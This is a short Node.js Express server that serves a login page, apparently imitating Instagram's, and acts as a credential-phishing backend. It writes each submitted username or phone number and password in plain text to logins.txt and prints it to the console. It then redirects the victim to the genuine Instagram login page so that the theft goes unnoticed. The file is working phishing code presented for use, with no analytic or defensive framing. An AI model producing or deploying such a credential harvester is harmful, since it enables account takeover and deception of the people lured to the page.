const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

const USERS_FILE = path.join(__dirname, 'logins.txt');

app.get('/', (req, res) => res.render('login'));

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) return res.redirect('/');

  fs.appendFileSync(USERS_FILE, `Email or phone number: ${username} | Password: ${password}\n`);
  console.log(`Login saved: ${username} | ${password}`);

  res.redirect('https://www.instagram.com/accounts/login/?hl=en');
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});